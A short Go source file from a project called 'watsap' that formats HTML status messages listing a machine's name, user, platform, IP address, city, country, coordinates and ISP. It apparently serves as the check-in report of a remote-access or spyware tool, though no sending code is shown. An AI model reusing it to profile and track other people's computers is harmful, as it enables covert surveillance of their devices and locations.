package messages

import (
	"fmt"
	"watsap/plugins/geoip"
	"watsap/utils/config"
)

// First run message
//var FirstRunMsg = fmt.Sprintf("Watsap initialized for UserName: %s\nID: %s \n", config.UserName, *config.UserID)

// back online message
//var BackOnlineMsg = fmt.Sprintf("Watsap back online for UserName: %s\nID: %s \n", config.UserName, *config.UserID)

// init message
func GetInitMsg() string {

	return fmt.Sprintf(`
<b>Watsap version:</b> <code>%s</code>
	
<b>Status</b>
<b>First Run:</b> <code>%t</code>
<b>Computer:</b> <code>%s</code>
<b>User:</b> <code>%s</code>
<b>Platform:</b> <code>%s</code>

<b>Network</b>
<b>IP:</b> <code>%s</code>
<b>City:</b> <code>%s</code>
<b>Country:</b> <code>%s</code>
<b>Location:</b> <code>%s</code>
<b>ISP:</b> <code>%s</code>`, config.WaVersion, config.FirstRun, config.PcName, config.UserName, config.Platform, geoip.UserIP, geoip.UserCity, geoip.UserCountry, geoip.UserLoc, geoip.UserISP)
}

// short user info
func GetUserInfoMsg() string {
	return fmt.Sprintf(`<b>User:</b> <code>%s</code>
<b>ID:</b> <code>%s</code>`, config.UserName, *config.UserID)
}

// online message
func GetOnlineMsg() string {
	return fmt.Sprintf(`<b>%s</b> is online</b>
	<b>ID:</b> <code>%s</code>`, config.UserName, *config.UserID)
}
